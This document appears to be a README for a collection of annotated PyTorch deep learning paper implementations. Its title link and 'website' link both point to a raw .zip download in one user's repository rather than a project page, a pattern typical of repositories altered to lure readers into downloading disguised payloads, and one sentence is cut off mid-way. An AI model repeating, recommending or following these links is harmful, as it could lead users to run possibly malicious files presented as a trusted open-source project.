# [https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip Deep Learning Paper Implementations](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)

This is a collection of simple PyTorch implementations of
neural networks and related algorithms.
These implementations are documented with explanations,

[The website](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
renders these as side-by-side formatted notes.
We believe these would help you understand these algorithms better.

We are actively maintaining this repo and adding new 
implementations almost weekly.
